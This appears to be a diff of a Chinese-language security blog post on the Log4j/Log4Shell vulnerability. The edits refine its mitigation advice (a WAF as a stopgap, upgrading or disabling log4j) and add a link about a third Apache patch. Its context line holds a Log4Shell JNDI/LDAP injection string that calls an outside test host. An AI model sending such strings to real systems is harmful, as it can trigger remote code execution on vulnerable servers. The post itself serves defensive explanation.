@@ -130,9 +130,9 @@ ${jndi:ldap://cymetrics.io/test}
 
 ![](/img/posts/huli/what-is-log4j-and-log4shell/attack.png)
 
-如果來不及把根本原因修掉，可以先上 WAF（Web Application Firewall），簡單來說就是針對網站的防火牆，把那些惡意的字串擋掉，例如說 [Cloudflare](https://blog.cloudflare.com/protection-against-cve-2021-45046-the-additional-log4j-rce-vulnerability/) 就在第一時間增加了 WAF 的規則加以阻擋，不過也有很多人在研究怎麼繞過 WAF 的規則，因此這是治標不治本。
+如果來不及把根本原因修掉，可以先上 WAF（Web Application Firewall），簡單來說就是針對網站的防火牆，把那些惡意的字串擋掉，例如說 [Cloudflare](https://blog.cloudflare.com/protection-against-cve-2021-45046-the-additional-log4j-rce-vulnerability/) 就在第一時間增加了 WAF 的規則加以阻擋，不過也有很多人在研究怎麼繞過 WAF 的規則，因此這是治標不治本的做法。
 
-治本的方法就是把 log4j 停用或是升版，升級到不會被這個漏洞影響的版本，但有些時候第一時間的改版可能沒有把漏洞完全補掉，因此記得更新完以後還是要密切注意是否有更新的版本。
+治本的方法就是把 log4j 停用或是升版，升級到不會被這個漏洞影響的版本，但有些時候第一時間的改版可能沒有把漏洞完全補掉，因此記得更新完以後還是要密切注意是否有更新的版本。例如說在這篇文章寫完後過沒多久，官方就釋出了第三個 patch 修復其他相關問題：[Apache Issues 3rd Patch to Fix New High-Severity Log4j Vulnerability](https://thehackernews.com/2021/12/apache-issues-3rd-patch-to-fix-new-high.html)
 
 ## 結語
 
